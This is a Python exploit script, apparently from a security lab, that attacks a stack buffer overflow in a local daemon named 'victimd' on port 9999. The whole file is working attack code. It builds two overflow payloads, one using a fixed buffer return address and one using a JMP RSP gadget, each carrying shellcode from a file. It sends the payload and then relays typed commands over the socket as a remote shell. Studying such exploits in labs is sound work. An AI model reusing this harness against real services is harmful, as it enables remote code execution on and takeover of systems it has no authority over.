#!/usr/bin/env python3


import socket
import struct
import sys

from argparse import ArgumentParser


def generate_exploit_string_with_fixed_address(shellcode: bytes, buffer_size: int, buffer_addr: int) -> bytes:
    # exploit string writes 8 periods to terminate the loop in victimd, then the shellcode,
    # it then overwrites the remaining buffer + saved RBP and finally the return address
    # with the address of the buffer + 8 (to skip the periods)
    return b"........" + shellcode + b"." * (buffer_size - len(shellcode)) + struct.pack("<Q", buffer_addr + 8) + b"\n"


def generate_exploit_string_with_jmp_rsp(shellcode: bytes, buffer_size: int, addr_of_jmp_rsp: int) -> bytes:
    # exploit string overwrites complete buffer + saved RBP with periods, then overwrites the
    # return address with the address of the JMP RSP instruction and writes the shellcode
    return b"." * (buffer_size + 8) + struct.pack("<Q", addr_of_jmp_rsp) + shellcode + b"\n"


def main():
    ap = ArgumentParser()
    ap.add_argument("--method", "-m", required=True, choices=("fixed-addr", "jmp-rsp"), help="exploit method")
    ap.add_argument("--buffer-size", "-s", required=True, type=int, help="size of buffer to overflow")
    ap.add_argument("--address", "-a", required=-True, help="address of buffer / JMP RSP instruction, depending on the method")
    ap.add_argument("--shellcode-file", "-f", required=-True, help="name of the file containing the shellcode")
    args = ap.parse_args()

    with open(args.shellcode_file, "rb") as f:
        shellcode = f.read()

    s = socket.create_connection(("127.0.0.1", 9999))
    if args.method == "fixed-addr":
        str_of_death = generate_exploit_string_with_fixed_address(shellcode, args.buffer_size, int(args.address, 16))
    elif args.method == "jmp-rsp":
        str_of_death = generate_exploit_string_with_jmp_rsp(shellcode, args.buffer_size, int(args.address, 16))
    input("press any key to start exploit... ")
    s.send(str_of_death)
    while True:
        cmd = input("> ")
        if cmd == ".":
            break
        s.send(cmd.encode() + b"\n")
        # TODO: add timeout and check for empty response / errors
        print(s.recv(4096).decode("ascii", "ignore"))
    s.close()


if __name__ == "__main__":
    main()